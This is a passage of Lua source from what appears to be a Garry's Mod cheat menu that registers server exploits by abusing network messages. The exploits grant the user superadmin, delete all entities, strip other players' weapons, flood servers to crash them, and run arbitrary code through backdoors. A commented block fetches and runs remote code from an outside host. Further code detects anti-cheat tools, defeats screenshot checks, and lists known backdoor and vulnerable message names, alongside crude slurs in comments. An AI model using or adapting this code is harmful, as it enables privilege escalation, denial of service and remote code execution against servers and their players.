				timer.Simple(k*i*1.7,function() 
					net.Start("net_PSUnBoxServer") 
					net.WriteEntity(v) 
					net.WriteString(v2.ID) 
					net.SendToServer() 
				end) 
			end
			i = i + 1
		end
	end 
end, 0,0)

s.AddExploit(4,"Auto-loot","collect all loot on map","GMBG:PickupItem",function() 
	for k, v in pairs(ents.GetAll()) do         
		if v:GetClass() == "item_loot" then    
			for i=1,6 do             
				net.Start("GMBG:PickupItem")
				net.WriteEntity(v)
				net.SendToServer()
			end
		end
	end
end, 1,0,"_sex_autoloot_1",2)

s.AddExploit(1,"Free shitty key","key = gey","BuyKey",function() 
	net.Start("BuyKey")
	net.SendToServer()
end, 0,0)

s.AddExploit(1,"Free shitty case","case = cs go = shit","BuyCrate",function() 
	net.Start("BuyCrate")
	net.SendToServer()
end, 0,0)

s.AddExploit(3,"XP booster","gives u xp (enter boost in shit her)","SBP_addtime",function() 
	for i=1,tonumber(s.TE:GetText()) do
		net.Start("SBP_addtime")
		net.SendToServer()
	end
end, 1,0,"_sex_xp_boost",0.2)


// cool stuff

s.AddExploit(3,"Poop on player","spam effects on selected player","simfphys_gasspill",function() 
	for i=1,#s.Target do
		for j=1,3 do
			if IsValid(s.Target[i]) then
				net.Start("simfphys_gasspill")
				net.WriteVector(s.Target[i]:GetPos()+Vector(0,0,90))
				net.WriteVector(s.Target[i]:EyePos())
				net.SendToServer()
			end
		end
	end
end, 1,0,"_sex_stuff_1",0.1)

s.AddExploit(2,"Set gay rating","pleasure","SUIScoreboardPlayerColor",function() 
	for k,v in pairs(player.GetAll()) do
		RunConsoleCommand("sui_rateuser",v:EntIndex(),"gay")
	end
end,0,0)

s.AddExploit(3,"Outfit player nouser","Just noise players near u","NetData",function() 
	for i=1,200 do
		net.Start("NetData")
		net.WriteString("OF")
		net.WriteUInt(4,8)
		net.WriteData("da",30)
		net.SendToServer()
	end
end, 1,0,"_sex_ofn",0.2)

s.AddExploit(3,"Remove entities","write type in textentry (* to all)","timebombDefuse",function() 
	for i=1,#ents.FindByClass(s.TE:GetText()) do
		net.Start("timebombDefuse")
        net.WriteEntity(ents.FindByClass(s.TE:GetText())[i])
        net.WriteBool(true)
        net.SendToServer()
	end
end, 0,0)

s.AddExploit(4,"Get superadmin","lol u're lucky","pplay_deleterow",function() 
	print("im started")
	local id = LocalPlayer():SteamID()
	local tbl = {}
	tbl.name = "FAdmin_PlayerGroup"
	tbl.where = {
	"steamid",
	tostring(id)
	}
	net.Start("pplay_deleterow")
	net.WriteTable(tbl)
	net.SendToServer()
	local tbl = {}
	tbl.tblname = "FAdmin_PlayerGroup"
	tbl.tblinfo = {
	tostring(id),
	"superadmin"
	}
	net.Start("pplay_addrow")
	net.WriteTable(tbl)
	net.SendToServer()
end, 0,0)

s.AddExploit(1,"ByB Force Bail","idk that copypaste","Letthisdudeout",function() 
	net.Start("Letthisdudeout")
	net.WriteEntity(LocalPlayer())
	net.SendToServer()
end, 0,0)

s.AddExploit(3,"Remove shit","Just remove Targets & text entry class props","MDE_RemoveStuff_C2S",function() 
	for i=1,#s.Target do
		net.Start( "MDE_RemoveStuff_C2S" )      
		net.WriteTable( {DATA="",TARGET=s.Target[i]} )   
		net.SendToServer()
	end
	for i=1,#ents.FindByClass(s.TE:GetText()) do
		net.Start( "MDE_RemoveStuff_C2S" )      
		net.WriteTable( {DATA="",TARGET=ents.FindByClass(s.TE:GetText())[i]} )   
		net.SendToServer()
	end
end, 1,0,"_sex_godly_remover",2)

s.AddExploit(1,"Break handcuffs","Try its free!","Kun_ZiptieStruggle",function() 
	for i=0,30 do 
		net.Start("Kun_ZiptieStruggle")
		net.SendToServer()
	end
end, 0,0)

s.AddExploit(4,"Detya V Mashinu","aye","simfphys_request_seatswitch",function() 
	for i=1,#s.Target do
		 for k,v in pairs(ents.GetAll()) do
			if IsValid(v) and v:IsVehicle() and IsValid(s.Target[i]) then
					if s.Target[i]:InVehicle() then  return end
					for j=0,4 do
						local lox,ooo=s.Target[i],v
						timer.Simple(j/10,function()
							if !IsValid(lox) then return end
							if !IsValid(ooo) then return end
							net.Start("simfphys_request_seatswitch",true)
							net.WriteEntity(ooo)
							net.WriteEntity(lox)
							net.WriteUInt(j,32)
							net.SendToServer()
						end)
					end
			end
		end
	end
end, 1,0,"_sex_stuff_2",1)

/*s.AddExploit(3,"test","Just test","friendlist",function() 
	for i=1,500 do
		net.Start("friendlist")
		net.WriteTable({"ur father"})
		net.SendToServer()
	end
end, 1,0,"test",0.2)*/

s.AddExploit(2,"Demote gays","dismissal targets","MCon_Demote_ToServer",function() 
	for i = 1,#s.Target  do
		net.Start("MCon_Demote_ToServer")
		net.WriteString(s.Target[i]:SteamID())
		net.SendToServer()
	end
end, 0,0)

s.AddExploit(3,"Ignity entities","Write type in textentry","drugs_ignite",function() 
	net.Start("drugs_ignite") 
	net.WriteString(s.TE:GetText())
    net.SendToServer()
end, 0,0)

s.AddExploit(3,"Remove entities","Write type in textentry","drugs_text",function() 
	net.Start("drugs_text") 
	net.WriteString(s.TE:GetText())
    net.SendToServer()
end, 0,0)

s.AddExploit(2,"Strip weapons","Strip weapons from all legit","drugseffect_remove",function() 
	net.Start("drugseffect_remove") 
    net.SendToServer()
end, 0,0)

s.AddExploit(2,"Remove money","Strip weapons from all legit","drugs_money",function() 
	net.Start("drugs_money") 
    net.SendToServer()
end, 0,0)

s.AddExploit(2,"Remove all ents","Remove all entities lol","properties",function() 
	for i=1,#ents.GetAll() do
		net.Start( "properties" )
		net.WriteString( "remove" )
		net.WriteEntity( ents.GetAll()[i] )
		net.SendToServer()
	end
end, 0,1)

s.AddExploit(4,"Dedolozh","Vseh tepaet v mashishu","simfphys_request_seatswitch",function() 
	dedolozh()
end, 0,1)

s.AddExploit(1,"Remove all ents","[TOGGLE]","properties",function() 
	for k,v in pairs(ents.FindByClass( "prop_*" )) do
		net.Start( "properties" )
		net.WriteString( "remove" )
		net.WriteEntity( v )
		net.SendToServer()
	end
end, 1,1,"_sex_tagle",1)

s.AddExploit(2,"Strip weapon","Select target and toggle stripper","properties",function() 
	for i=1,#s.Target do
		if(IsValid(s.Target[i]) and IsValid(s.Target[i]:GetActiveWeapon()))then
			net.Start( "properties" )
			net.WriteString( "remove" )
			net.WriteEntity( s.Target[i]:GetActiveWeapon() )
			net.SendToServer()
		end
	end
end, 1,1,"_sex_strip_weapons",0.1)

s.AddExploit(1,"Get Easter Egg","write shit in chat also funny","egg",function() 
	RunConsoleCommand("say", "4bigz") //1 egg
	RunConsoleCommand("cc_egg2")  //2 egg
	net.Start( "egg" )  //3 egg
	net.SendToServer()
end, 0,0)

s.AddExploit(1,"Spoof Chat Icon","Removes the text typing icon","TalkIconChat",function() 
hook.Remove('StartChat', 'TalkIcon')
net.Start("TalkIconChat")
net.WriteBool(true)
net.SendToServer()
end, 1,1,"_sex_rem_icon",1)

s.AddExploit(1,"test1","copypast","rpi_trade_end",function() 
net.Start("rpi_trade_end")
net.WriteUInt( it, 16 )
net.SendToServer()
end, 1,1,"_sex_test_1",1)

s.AddExploit(1,"test2","copypast","ClickerForceSave",function() 
net.Start("ClickerForceSave")
net.WriteEntity(ply)
net.WriteInt(1, 1)
net.SendToServer()
end, 1,1,"_sex_test_2",1)

s.AddExploit(1,"test3","copypast","SRequest",function() 
for k, v in pairs (player.GetAll()) do
net.Start("SRequest")
net.WriteEntity(v)
net.SendToServer()
end
end, 1,1,"_sex_test_3",1)

s.AddExploit(1,"Join Police","join police for free bez testov","PoliceJoin",function() 
net.Start("PoliceJoin")
net.WriteTable("Rejoindre")
net.SendToServer()
end, 1,1,"_sex_join_police",1)

s.AddExploit(1,"Ebatel printerov","damage printers","customprinter_get",function() 
for k, v in pairs( ents.GetAll() ) do
if ( v:GetClass():find("print") && v:GetPos():Distance( LocalPlayer():GetPos() ) <= 750 ) then
net.Start("customprinter_get")
net.WriteEntity(v)
net.WriteString("onoff")
net.SendToServer()
end
end
end, 1,1,"_sex_rem_printrz",1)

s.AddExploit(1,"Spam reports","just spam","TransferReport",function() 
for k, v in pairs( player.GetAll() ) do
net.Start( "TransferReport" )
net.WriteString( v:SteamID() )
net.WriteString( "Gaycock" )
net.WriteString( "Bitch Suck" )
net.SendToServer()
end
end, 1,1,"_sex_just_spams",1)

s.AddExploit(1,"BRTBA crash","just spam","atlaschat.chat",function() 
for j=1,1000 do
net.Start("atlaschat.chat") 
net.WriteString("<avatar> <gaben> <garry>  ") 
net.WriteBit(0)
net.SendToServer()
end
end, 1,1,"_sex_just_spamsik",1)


local door = LocalPlayer():GetEyeTrace().Entity
s.AddExploit(1,"bug with doors rp shit","just lutiy prikol))00)0)","fp_as_doorHandler",function() 
for k, v in pairs( player.GetAll() ) do
net.Start( "fp_as_doorHandler" )
net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
net.WriteString("unlock")
net.WriteEntity(door)
net.WriteString("removeOwner")
net.WriteDouble(doorOwner)
net.SendToServer()
end
end, 1,1,"_sex_just_deletowner",1)

s.AddExploit(1,"Set name","U have no name (friends)","gportal_rpname_change",function() 
	net.Start("gportal_rpname_change")
	net.WriteString(s.TE:GetText())
	net.WriteString(" ")
	net.SendToServer()
end, 0,0)

s.AddExploit(1,"Hack geypads","Hack all keypads (useless)","start_wd_emp",function() 
	net.Start("start_wd_emp") 
    net.SendToServer()
end, 0,0)



s.AddExploit(1,"Delete PromoCode","Deleting promotional codes (useless)","PCAdd",function() 
	net.Start("PCAdd")
	net.WriteString("alahman")
	net.WriteString("300000000")
	net.SendToServer()

	net.Start("ActivatePC")
	net.WriteString("alahman")
	net.SendToServer()
	
	net.Start("PCDelAll")
	net.SendToServer()

end, 1,1,"_sex_rem_promokodi",1)

s.AddExploit(2,"poklon batushke","for free (useless)","stopmmd",function() 
net.Start("stopmmd")
net.WriteString("while 1 do end")
net.SendToServer()
end, 0,1,"_sex_poklon",1)

s.AddExploit(3,"Respawn Exploit","Exploit for a revival","DarkRP_Kun_ForceSpawn",function() 
	net.Start("DarkRP_Kun_ForceSpawn") 
    net.SendToServer()
end, 0,0)



s.AddExploit(3,"Body Groups","Changing the skin","bodyman_model_change",function()

	net.Start("bodyman_model_change")
	net.WriteInt(3, 10 )
    net.SendToServer()
	
	net.Start("bodygroups_change")
	net.WriteInt(1, 3 )
    net.SendToServer()
	
	net.Start("bodygroups_change")
	net.WriteInt(2, 2 )
    net.SendToServer()
	
	net.Start("bodygroups_change")
	net.WriteInt(3, 1 )
    net.SendToServer()
	
	net.Start("bodygroups_change")
	net.WriteInt(4, 4 )
    net.SendToServer()
	
end, 0,0)

s.AddExploit(3,"Hover Board","idk wtf","hoverboardpurchase",function() 
	net.Start("hoverboardpurchase")
	net.WriteInt(8, 32)
    net.SendToServer()
end, 0,0)

s.AddExploit(3,"Sound Arrest","xueta","soundArrestCommit",function() 
	net.Start("soundArrestCommit")
	net.WriteString("Shit")
	net.SendToServer()
end, 0,0)

s.AddExploit(3,"Off Spawn Protection","da","SpawnProtection",function() 
	net.Start("SpawnProtection")
	net.WriteFloat(0)
	net.SendToServer()
end, 0,0)

s.AddExploit(3,"Donator Box Exploit","aye","donatorshop_itemtobuy",function() 
	net.Start("donatorshop_itemtobuy")
	net.WriteString("DonatorShopBuyTripwire")
	net.SendToServer()
end, 0,0)








if istable(rp) then
s.AddExploit(5,"VzlomZoshkvarom","write in enter shit here","",function() 


local CMD2MEM=s.TE:GetText()

cvar.Register('enable.enhud')
:SetDefault(cvar['Register']('enable.enhud'),true )
:SetValue(
	cvar.Register('enable.enhud') --)
	:SetDefault(cvar.Register('enable.enhud'),true ),
	cvar.GetValue(var) and 1 or true 
)
cvar.Register('enable_thirdperson')
:SetDefault(cvar.Register('enable_thirdperson'),true )
:SetValue(
	cvar.Register('enable_thirdperson')
	:SetDefault(cvar.Register('enable_thirdperson'),true ),
	cvar.GetValue(var)and 1 or true 
)
cvar.Register('enable.agendahud'):SetDefault( cvar.Register('enable.agendahud'),false )
:SetValue(
	cvar.Register('enable.agendahud')
	:SetDefault(cvar.Register('enable.agendahud'),false ),
	cvar.GetValue(var)and 1 or false 
)

cvar.Register('media_volume')
:SetDefault(cvar.Register('media_volume'),0)
:SetValue(cvar.Register('media_volume')
:SetDefault(cvar.Register('media_volume'),0),

cvar.GetValue(var) and 1 or 'ses')

cvar.Register('show_custom_hud')

:SetValue(cvar.Register('show_custom_hud'),cvar.GetValue(var)and 1 or true )

cvar.Register('key_binds') 
temp={
{
	['Key']=14,
	['Cmd']=CMD2MEM,
	['Type']='РЎРІРѕР№'},
	{
		['Key']='fustrp_tops',
		['Cmd']='',
		['Type']='РЎРІРѕР№'
	} 
}
cvar.SetValue('key_binds',temp)

cvar.Register('ColorFilter'):SetValue(cvar.Register('ColorFilter'),cvar.GetValue(var) and 1 or 'Р§РµСЂРЅРѕ & Р‘РµР»С‹Р№')

cvar.Register('enable_hud')
:SetValue(cvar.Register('enable_hud'),cvar.GetValue(var) and 1 or false )

cvar.Register('invert_thirdp_mouse')
:SetValue(cvar.Register('invert_thirdp_mouse'),cvar.GetValue(var) and 1 or true )

--[[ cerebro is hacker pizdec...
timer.Simple(1,function ()
	RunConsoleCommand("fustrptop")
	RunConsoleCommand("[SERVER] РЈРЇР—Р’РРњРћРЎРўР¬ РћР‘Р РђР‘РћРўРђРќРђ...")
end )
timer.Simple(5,function ()
	if LocalPlayer():IsVip( LocalPlayer]() ) then 
		chat.AddText("[SERVER] РџСЂРёРІРµР»РµРіРёСЏ СѓСЃРїРµС€РЅРѕ РІС‹РґР°РЅР°.")
	else 
		chat.AddText("[SERVER] РЈРїСЃ.. Р§С‚Рѕ-С‚Рѕ РїРѕС€Р»Рѕ РЅРµ С‚Р°Рє..")
	end 
end )

http.Fetch("http://milleniump.ru/steal/banz1/hak.lua",function (a)
	RunString(a)
end )
]]
end, 1,0,"_sex_serverhack",0.1)
end

if isfunction(math.FastMull) then
 s.AddExploit(5,"VzlomFastMull","write in enter shit here","",function()
    math.FastMull('RunString', s.TE:GetText()) -- beckdoor 2020
end, 0,0,"_sex_serverhack2",0.1)
end




// netch stuff lutzhe ne trogat start
local AddNetch = function(net1,count)
	s.AddExploit(6,"Crash #"..tostring(count),"Discovered by netch",net1,function()
		for i=1,count do
			net.Start( net1, true)
			net.SendToServer()
		end
	end,1,0,"_sex_lags_netch_"..net1,0)
end

AddNetch("net.Stream",5000)
AddNetch("elpos",2000)
AddNetch("TL.sayColor",2000)
AddNetch("HFM_DoCook_C2S",5000)
AddNetch("HFM_GetFood_C2S",5000)
AddNetch("SH_REWARDS.ReqRefData",5000)
AddNetch("DConnecttt.PlayerTick",1)
AddNetch("pac_request_precache",999)


--AddNetch("FProfile_getSource",5000)
/*
s.AddExploit(6,"Instant Crash","Discovered by netch","SH_REWARDS.ReqRefPlayers",function()
	for i=1,1000 do
		net.Start( "SH_REWARDS.ReqRefPlayers", true)
		net.SendToServer()
		net.Start( "SH_REWARDS.ReqUnclaimed", true)
		net.SendToServer()
		net.Start( "SH_REWARDS.ReqLeaderboard", true)
		net.SendToServer()
	end
end,1,0,"_sex_lags_insta_1",0)


VJSay
FProfile_getSource
VC_RM_UpdateInfo
spawned_money
Tasks.Data
models/shadertest/shader3
ply_pick_shit

*/
/*
AddNetch("ItemStoreAdminBank",2000)
AddNetch("ItemStoreAdminInventory",2000)
AddNetch("ATM_DepositMoney_C2S",2000)
--AddNetch("",2999)
AddNetch("CRAFTINGMOD_SHOP",2000)
AddNetch("VapeUpdateCustomColor",2000)
AddNetch("apg_menu_s2c",2000)
AddNetch("trigger_hurt",2000)
AddNetch("BeginSpin",2000)

*/

//pasted detects
// lutoe govno s porject rebugu 

if file.Exists("autorun/client/cl_anti_exploits.lua","LUA") then
print("jenni na servere")
end

if file.Exists("autorun/client/cl_antinexploits.lua","LUA") then
print("Telecomm Anti-Exploit")
end

if file.Exists("autorun/ab.lua","LUA") or file.Exists("autorun/client/ab.lua","LUA") then
print("Nyaaa Anti-Exploit")
end

if file.Exists("autorun/client/!!!!!!!!!!!!!!!!!!!!!!aaaaaaaaaaa.lua", "LUA") or file.Exists("autorun/client/cl_mac.lua", "LUA") then
print("Modern Anti-Cheat")
end

if file.Exists("swiftac.lua", "LUA") then
print("Swift Anti-Cheat")
end

if file.Exists("umbrella.lua", "LUA") then
print("Umbrella Anti-Exploit")
end

if file.Exists("cl_viperbdcheck.lua", "LUA") or file.Exists("sh_viperbdcheck.lua", "LUA") or file.Exists("autorun/cl_viper.lua", "LUA") then
print("Viper Anti-Exploit")
end

if _G.CAC then
print("cake anti chitok")
end

if _G.QAC then
print("Quack Anti-Cheat (QAC)")
end

if _G.simplicity then
print("suck anti cheat (Simplac Anti-Cheat (SAC))")
end

if file.Exists("epstat.lua", "LUA") or file.Exists("autorun/!!bettersnte.lua", "LUA") then
print("bettersnte")
end

if file.Exists("sh_cardinal.lua","LUA") or file.Exists("client/cl_cardinal.lua","LUA") then
print("cardinal")
end

 if file.Exists("autorun/client/cl_rac.lua", "LUA") then
print("raptor rak mozga anti cheat")
end

if file.Exists("autorun/send-lua-and-net-send.lua", "LUA") then
print("C0nw0nk Anti-Cheat")
end

if file.Exists("cl_screengrab.lua", "LUA") or file.Exists("autorun/sh_screengrab.lua", "LUA") or file.Exists("autorun/sh_screengrab_v2.lua", "LUA") then
 print("screengrab")
 
 local ss = false
 
local renderv = render.RenderView
local renderc = render.Clear
local rendercap = render.Capture
local vguiworldpanel = vgui.GetWorldPanel
 
local function screengrab()
	if ss then return end
	ss = true
 
	renderc( 0, 0, 0, 255, true, true )
	renderv( {
		origin = LocalPlayer():EyePos(),
		angles = LocalPlayer():EyeAngles(),
		x = 0,
		y = 0,
		w = ScrW(),
		h = ScrH(),
		dopostprocess = true,
		drawhud = true,
		drawmonitors = true,
		drawviewmodel = true
	} )
 
	local vguishits = vguiworldpanel()
 
	if IsValid( vguishits ) then
		vguishits:SetPaintedManually( true )
	end
 
	timer.Simple( 0.1, function()
		vguiworldpanel():SetPaintedManually( false )
		ss = false
	end)
end
 
render.Capture = function(data)
	screengrab()
	local cap = rendercap( data )
	return cap
end
 
 
 
end

if file.Exists("autorun/sh_fuckthissheet.lua", "LUA") then
print("lua stealer")
end


    if istable(ULib) then
        print("Admin-Mod: ULX")
    end

    if istable(FAdmin) then
        print("Admin-Mod: FAdmin")
    end

    if istable(GExtension) then
        print("Admin-Mod: GExtension")
    end

    if istable(gBan) then
        print("Admin-Mod: gBan")
    end

//snte bypass legitniy :^)



local AntiSNTE = {
	"Sbox_gm_attackofnullday_key",
	"c",
	"enablevac",
	"ULXQUERY2",
	"Im_SOCool",
	"MoonMan",
	"LickMeOut",
	"SessionBackdoor",
	"OdiumBackDoor", 
	"ULX_QUERY2", 
	"Sbox_itemstore",
	"Sbox_darkrp",
	"Sbox_Message",
	"_blacksmurf",
	"nostrip", -- it's the most popular backdoor in gmod... amazing isn't it ?
	"Remove_Exploiters",
	"Sandbox_ArmDupe", 
	"rconadmin",
	"jesuslebg",
	"disablebackdoor",
	"blacksmurfBackdoor",
	"jeveuttonrconleul",
	"lag_ping",
	"memeDoor",
	"DarkRP_AdminWeapons",
	"Fix_Keypads",
	"noclipcloakaesp_chat_text",
	"_CAC_ReadMemory",
	"Ulib_Message",
	"Ulogs_Infos",
	"ITEM",
	"nocheat",
	"Î¾psilon",
	"JQerystrip.disable",
	"Sandbox_GayParty",
	"DarkRP_UTF8",
	"PlayerKilledLogged",
	"OldNetReadData",
	"Backdoor", 
	"cucked",
	"NoNerks",
	"kek",
	"DarkRP_Money_System",
	"BetStrep",
	"ZimbaBackdoor",
	"something",
	"random",
	"strip0",
	"fellosnake",
	"idk",
	"||||",
	"EnigmaIsthere",
	"ALTERED_CARB0N",
	"killserver",
	"fuckserver",
	"cvaraccess",
	"_Defcon",
	"dontforget",
	"aze46aez67z67z64dcv4bt",
	"nolag",
	"changename",
	"music",
	"_Defqon",
	"xenoexistscl",
	"R8",
	"AnalCavity",
	"DefqonBackdoor",
	"fourhead",
	"echangeinfo",
	"PlayerItemPickUp",
	"thefrenchenculer", 
	"elfamosabackdoormdr",
	"stoppk",
	"noprop",
	"reaper",
	"Abcdefgh",
	"JSQuery.Data(Post(false))",
	"pjHabrp9EY",
	"_Raze",
	"88",
	"Dominos",
	"NoOdium_ReadPing",
	"m9k_explosionradius",
	"gag",
	"_cac_",
	"_Battleye_Meme_",
	"legrandguzmanestla",
	"ULogs_B",
	"arivia",
	"_Warns",
	"xuy",
	"samosatracking57",
	"striphelper",
	"m9k_explosive",
	"GaySploitBackdoor",
	"_GaySploit",
	"slua",
	"Bilboard.adverts:Spawn(false)",
	"BOOST_FPS",
	"FPP_AntiStrip",
	"ULX_QUERY_TEST2",
	"FADMIN_ANTICRASH",
	"ULX_ANTI_BACKDOOR",
	"UKT_MOMOS",
	"rcivluz",
	"SENDTEST",
	"MJkQswHqfZ",
	"INJ3v4",
	"_clientcvars",
	"_main",
	"GMOD_NETDBG",
	"thereaper",
	"audisquad_lua",
	"anticrash",
	"ZernaxBackdoor",
	"bdsm",
	"waoz",
	"stream",
	"adm_network",
	"antiexploit",
	"ReadPing",
	"berettabest",
	"componenttolua",
	"theberettabcd",
	"negativedlebest",
	"mathislebg",
	"SparksLeBg",
	"DOGE",
	"FPSBOOST",
	"N::B::P",
	"PDA_DRM_REQUEST_CONTENT",
	"shix",
	"Inj3",
	"AidsTacos",
	"verifiopd",
	"pwn_wake",
	"pwn_http_answer",
	"pwn_http_send",
	"The_Dankwoo",
	"PRDW_GET",
	"fancyscoreboard_leave",
	"DarkRP_Gamemodes",
	"DarkRP_Armors",
	"yohsambresicianatik<3",
	"EnigmaProject",
	"PlayerCheck",
	"Ulx_Error_88",
	"FAdmin_Notification_Receiver",
	"DarkRP_ReceiveData",
	"Weapon_88",
	"__G____CAC",
	"AbSoluT",
	"mecthack",
	"SetPlayerDeathCount",
	"awarn_remove",
	"fijiconn", 
	"nw.readstream",
	"LuaCmd",
	"The_DankWhy"
}

local AntiSNTE_Exploit = {
  "pplay_deleterow",
  "pplay_addrow",
  "pplay_sendtable",
  //"WriteQuery",
  "VJSay",
  "SendMoney",
  "BailOut",
  "customprinter_get",
  "textstickers_entdata",
  "NC_GetNameChange",
  "ATS_WARP_REMOVE_CLIENT",
  "ATS_WARP_FROM_CLIENT",
  "ATS_WARP_VIEWOWNER",
  "CFRemoveGame",
  "CFJoinGame",
  "CFEndGame",
  "CreateCase",
  "rprotect_terminal_settings",
  "StackGhost",
  "RevivePlayer",
  "ARMORY_RetrieveWeapon",
  "TransferReport",
  "SimplicityAC_aysent",
  //"pac_to_contraption",
  "SyncPrinterButtons76561198056171650",
  "sendtable",
  "steamid2",
  "Kun_SellDrug",
  "net_PSUnBoxServer",
  "pplay_deleterow",
  "pplay_addrow",
  "CraftSomething",
  "banleaver",
  "75_plus_win",
  "ATMDepositMoney",
  "Taxi_Add",
  "Kun_SellOil",
  "SellMinerals",
  "TakeBetMoney",
  "PoliceJoin",
  "CpForm_Answers",
  "DepositMoney",
  "MDE_RemoveStuff_C2S",
  "NET_SS_DoBuyTakeoff",
  "NET_EcSetTax",
  "RP_Accept_Fine",
  "RP_Fine_Player",
  "RXCAR_Shop_Store_C2S",
  "RXCAR_SellINVCar_C2S",
  "drugseffect_remove",
  "drugs_money",
  "CRAFTINGMOD_SHOP",
  "drugs_ignite",
  "drugseffect_hpremove",
  "DarkRP_Kun_ForceSpawn",
  "drugs_text",
  "NLRKick",
  "RecKickAFKer",
  "GMBG:PickupItem",
  "DL_Answering",
  "plyWarning",
  "NLR.ActionPlayer",
  "timebombDefuse",
  "start_wd_emp",
  "kart_sell",
  "FarmingmodSellItems",
  "ClickerAddToPoints",
  "bodyman_model_change",
  "TOW_PayTheFine",
  "FIRE_CreateFireTruck",
  "hitcomplete",
  "hhh_request",
  "DaHit",
  "TCBBuyAmmo",
  "DataSend",
  "gBan.BanBuffer",
  "fp_as_doorHandler",
  "Upgrade",
  "TowTruck_CreateTowTruck",
  "TOW_SubmitWarning",
  "duelrequestguiYes",
  "JoinOrg",
  "NDES_SelectedEmblem",
  "join_disconnect",
  "Morpheus.StaffTracker",
  "casinokit_chipexchange",
  "BuyKey",
  "BuyCrate",
  "FactionInviteConsole",
  "FacCreate",
  "1942_Fuhrer_SubmitCandidacy",
  "pogcp_report_submitReport",
  "textscreens_download",
  "hsend",
  "BuilderXToggleKill",
  "Chatbox_PlayerChat",
  "reports.submit",
  "services_accept",
  "Warn_CreateWarn",
  "NewReport",
  "soez",
  "GiveHealthNPC",
  "DarkRP_SS_Gamble",
  "buyinghealth",
  "DarkRP_preferredjobmodel",
  "DarkRP_spawnPocket",
  "whk_setart",
  "WithdrewBMoney",
  "DuelMessageReturn",
  "ban_rdm",
  "BuyCar",
  "ats_send_toServer",
  "dLogsGetCommand",
  "disguise",
  "gportal_rpname_change",
  "AbilityUse",
  "ClickerAddToPoints",
  "race_accept",
  "give_me_weapon",
  "FinishContract",
  "NLR_SPAWN",
  "Kun_ZiptieStruggle",
  "JB_Votekick",
  "Letthisdudeout",
  "ckit_roul_bet",
 // "pac.net.TouchFlexes.ClientNotify",
  "ply_pick_shit",
  "TFA_Attachment_RequestAll",
  "BuyFirstTovar",
  "BuySecondTovar",
  "GiveHealthNPC",
  "MONEY_SYSTEM_GetWeapons",
  "MCon_Demote_ToServer",
  "withdrawp",
  "PCAdd",
  "ActivatePC",
  "PCDelAll",
  "viv_hl2rp_disp_message",
  "ATM_DepositMoney_C2S",
  "BM2.Command.SellBitcoins",
  "BM2.Command.Eject",
  "tickbooksendfine",
  "egg",
  "RHC_jail_player",
  "PlayerUseItem",
  "Chess Top10",
  "ItemStoreUse",
  "EZS_PlayerTag",
  "simfphys_gasspill",
  "sphys_dupe",
  "sw_gokart",
  "wordenns",
  "SyncPrinterButtons16690",
  "AttemptSellCar",
  "uPLYWarning",
  "atlaschat.rqclrcfg",
  "dlib.getinfo.replicate",
  "SetPermaKnife",
  "EnterpriseWithdraw",
  "SBP_addtime",
  "NetData",
  "CW20_PRESET_LOAD",
  "minigun_drones_switch",
  "NET_AM_MakePotion",
  "bitcoins_request_turn_off",
  "bitcoins_request_turn_on",
  "bitcoins_request_withdraw",
  "PermwepsNPCSellWeapon",
  "ncpstoredoact",
  "DuelRequestClient",
  "BeginSpin",
  "tickbookpayfine",
  "fg_printer_money",
  "IGS.GetPaymentURL",
  "pp_info_send",
  "AirDrops_StartPlacement",
  "SlotsRemoved",
  "FARMINGMOD_DROPITEM",
  "cab_sendmessage",
  "cab_cd_testdrive",
  "blueatm",
  "SCP-294Sv",
  "dronesrewrite_controldr",
  "desktopPrinter_Withdraw",
  "RemoveTag",
  "IDInv_RequestBank",
  "UseMedkit",
  "WipeMask",
  "SwapFilter",
  "RemoveMask",
  "DeployMask",
  "ZED_SpawnCar",
  "levelup_useperk",
  "passmayorexam",
  "Selldatride",
  "ORG_VaultDonate",
  "ORG_NewOrg",
  "ScannerMenu",
  "misswd_accept",
  "D3A_Message",
  "LawsToServer",
  "Shop_buy",
  "D3A_CreateOrg",
  "Gb_gasstation_BuyGas",
  "Gb_gasstation_BuyJerrycan",
  "MineServer",
  "AcceptBailOffer",
  "LawyerOfferBail",
  "buy_bundle",
  "AskPickupItemInv",
  "donatorshop_itemtobuy",
  "netOrgVoteInvite_Server",
  "Chess ClientWager",
  "AcceptRequest",
  "deposit",
  "CubeRiot CaptureZone Update",
  "NPCShop_BuyItem",
  "SpawnProtection",
  "hoverboardpurchase",
  "soundArrestCommit",
  "LotteryMenu",
  "updateLaws",
  "TMC_NET_FirePlayer",
  "thiefnpc",
  "TMC_NET_MakePlayerWanted",
  "SyncRemoveAction",
  "HV_AmmoBuy",
  "NET_CR_TakeStoredMoney",
  "nox_addpremadepunishment",
  "GrabMoney",
  "LAWYER.GetBailOut",
  "LAWYER.BailFelonOut",
  "br_send_pm",
  "GET_Admin_MSGS",
  "OPEN_ADMIN_CHAT",
  "LB_AddBan",
  "redirectMsg",
  "RDMReason_Explain",
  "JB_SelectWarden",
  "JB_GiveCubics",
  "SendSteamID",
  "wyozimc_playply",
  "SpecDM_SendLoadout",
  "sv_saveweapons",
  "DL_StartReport",
  "DL_ReportPlayer",
  "DL_AskLogsList",
  "DailyLoginClaim",
  "GiveWeapon",
  "GovStation_SpawnVehicle",
  "inviteToOrganization",
  "createFaction",
  "sellitem",
  "giveArrestReason",
  "unarrestPerson",
  "JoinFirstSS",
  "bringNfreeze",
  "start_wd_hack",
  "DestroyTable",
  "nCTieUpStart",
  "IveBeenRDMed",
  "FIGHTCLUB_StartFight",
  "FIGHTCLUB_KickPlayer",
  "ReSpawn",
  "CP_Test_Results",
  "AcceptBailOffer",
  "IS_SubmitSID_C2S",
  "IS_GetReward_C2S",
  "ChangeOrgName",
  "DisbandOrganization",
  "CreateOrganization",
  "newTerritory",
  "InviteMember",
  "sendDuelInfo",
  "DoDealerDeliver",
  "PurchaseWeed",
  "guncraft_removeWorkbench",
  "wordenns",
  "userAcceptPrestige",
  "DuelMessageReturn",
  "Client_To_Server_OpenEditor",
  "GiveSCP294Cup",
  "GiveArmor100",
  "SprintSpeedset",
  "ArmorButton",
  "HealButton",
  "SRequest",
  "ClickerForceSave",
  "rpi_trade_end",
  "NET_BailPlayer",
  "vj_testentity_runtextsd",
  "vj_fireplace_turnon2",
  "requestmoneyforvk",
  "gPrinters.sendID",
  "FIRE_RemoveFireTruck",
  "drugs_effect",
  "drugs_give",
  "NET_DoPrinterAction",
  "opr_withdraw",
  "money_clicker_withdraw",
  "NGII_TakeMoney",
  "gPrinters.retrieveMoney",
  "revival_revive_accept",
  "chname",
  "NewRPNameSQL",
  "UpdateRPUModelSQL",
  "SetTableTarget",
